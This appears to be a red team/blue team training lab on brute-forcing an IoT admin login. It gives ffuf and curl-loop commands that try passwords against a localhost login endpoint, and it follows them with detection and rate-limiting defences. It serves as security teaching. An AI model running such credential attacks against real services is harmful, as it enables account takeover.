# Part C: Weak Authentication & Brute Force Attacks

## Objective
The IoT backend features an administration panel protected by a native login system. Your objective is to perform a **Brute Force** or **Credential Stuffing** attack to compromise the `admin` account and gain system configuration access.

> [!NOTE]
> **Real-World Scenario:** Credential stuffing attacks account for billions of malicious login attempts daily. If a system lacks rate limiting, an attacker can test thousands of leaked passwords per minute until they find the correct one.

---

## 🔴 Red Team Instructions (Offense)

### 1. Reconnaissance
- **Action:** Identify the authentication endpoint. Use the browser's Network Tab to monitor a failed login attempt.
- **Target:** `POST /api/admin/login`
- **Data Structure:** `{"username":"admin", "password":"password123"}`

### 2. Weaponization
You need a list of passwords. If you were in a real competition, you'd use `rockyou.txt`. For this lab, create a small text file `passwords.txt` containing 20 words, ensuring the real password is included somewhere in the list.

### 3. The Attack
Use an automated tool to blast the login endpoint.
- **Using FFUF (Advanced):**
  ```bash
  ffuf -w passwords.txt -X POST -d '{"username":"admin","password":"FUZZ"}' \
       -H "Content-Type: application/json" -u http://localhost:3000/api/admin/login \
       -mc 200
  ```
- **Using a Bash Script (Fundamental):**
  ```bash
  for p in $(cat passwords.txt); do
    echo "Trying: $p"
    curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/api/admin/login \
         -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"$p\"}"
    echo ""
  done
  ```

### 4. Success Condition
You receive a `200 OK` HTTP status code and an authentication token (JWT or Session Cookie) in the response.

---

## 🔵 Blue Team Instructions (Defense)

### 1. Detection
- **Action:** Open your SIEM or check the `server.log`.
- **Indicator of Compromise (IoC):** A massive spike in `401 Unauthorized` responses originating from the exact same IP address within a very short timeframe.

### 2. Mitigation Strategy
A secure login requires multiple layers of defense to slow down or halt automation.

- **Action 1: Rate Limiting (The Immediate Fix)**
  Implement `express-rate-limit` on the login route to cap requests.
  ```javascript
  const rateLimit = require('express-rate-limit');
  const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 requests per windowMs
    message: "Too many login attempts from this IP, please try again later."
  });
  app.use('/api/admin/login', loginLimiter);
  ```

- **Action 2: Account Lockout (Defense in Depth)**
  Modify the user schema to track `failedLoginAttempts`. If it reaches 5, set `isLocked: true` and require an administrator to unlock it, or implement an exponential backoff timer.

### 3. Verification
Run your attack script again. The first 5 attempts will process normally, but the 6th onwards should instantly face-plant into a `429 Too Many Requests` error, drastically increasing the time required to brute-force the account.
